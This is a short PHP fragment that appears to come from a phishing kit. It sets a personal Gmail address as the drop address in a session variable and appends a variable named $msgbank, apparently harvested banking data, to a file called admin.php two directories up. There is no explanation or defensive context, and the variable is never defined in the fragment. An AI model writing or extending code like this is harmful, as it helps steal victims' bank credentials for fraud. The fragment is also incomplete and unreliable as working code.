<?php

$yourmail = $_SESSION['_yourmail_']   = 'kirky0409@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>